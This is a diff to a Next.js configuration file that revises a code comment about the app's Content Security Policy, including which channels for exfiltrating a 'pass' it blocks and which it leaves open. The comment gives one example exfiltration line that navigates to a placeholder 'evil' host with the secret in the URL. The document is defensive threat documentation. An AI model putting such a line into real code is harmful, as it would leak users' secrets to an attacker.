@@ -29,12 +29,17 @@ const nextConfig: NextConfig = {
   //
   // The CSP's value is its **exfiltration-blocking** directives — `default-src`/`connect-src`/`img-src`/
   // `font-src`/`form-action`/`base-uri` are all same-origin and `object-src`/`frame-ancestors` are
-  // `none`, so even an injected script can't fetch/beacon/POST the pass to another origin, hijack the
-  // base URI, or be framed. `script-src` keeps `'self'` (no external script origins) but must allow
-  // `'unsafe-inline'`: Next emits inline hydration scripts, and a nonce/`strict-dynamic` policy can't be
-  // used because Next 16's `proxy`/`middleware` does not propagate a per-request nonce to those scripts
-  // (verified — the nonce never lands on the <script> tags, so `strict-dynamic` blocks all hydration).
-  // A nonce-based `script-src` is tracked as future work pending that framework limitation.
+  // `none`, so an injected script can't fetch/XHR/beacon/POST the pass to another origin, load an
+  // external script, hijack the base URI, or be framed. It does NOT block every channel: a top-level
+  // navigation exfil (`location = "https://evil/?p=" + pass`) is not stopped — `navigate-to` was dropped
+  // from CSP and ships in no browser — but that still requires an injected script to RUN, and the
+  // renderer has no sink today. Closing that last channel needs a strict `script-src` that blocks the
+  // injection itself: `script-src` keeps `'self'` (no external origins) but must allow `'unsafe-inline'`
+  // because Next emits inline hydration scripts and a nonce/`strict-dynamic` policy can't be used —
+  // Next 16's `proxy`/`middleware` does not propagate a per-request nonce to those scripts (verified: the
+  // nonce never lands on the <script> tags, so `strict-dynamic` blocks all hydration). A nonce'd
+  // `script-src` (which WOULD close the navigation channel) is tracked as future work pending that
+  // framework limitation.
   async headers() {
     const csp = [
       "default-src 'self'",
